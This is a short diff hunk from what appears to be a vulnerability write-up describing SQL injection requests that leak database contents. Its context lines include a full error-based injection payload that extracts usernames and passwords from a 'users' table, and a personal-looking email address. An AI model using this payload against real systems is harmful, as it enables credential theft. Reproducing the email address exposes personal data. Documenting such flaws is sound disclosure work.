@@ -46,7 +46,9 @@ Sending the following requests in order
   Leaks the second column name in the DB
   
   .
+
   .
+
   .
   
 + `"sridhardked@gmail.com' AND SELECT * FROM users WHERE id = '1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT MID(username,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 0,1),':',(SELECT MID(password,1,63) FROM users LIMIT 2,1), FLOOR(RAND()*5)) AS a FROM information_schema.tables GROUP BY a)x)-- -"`
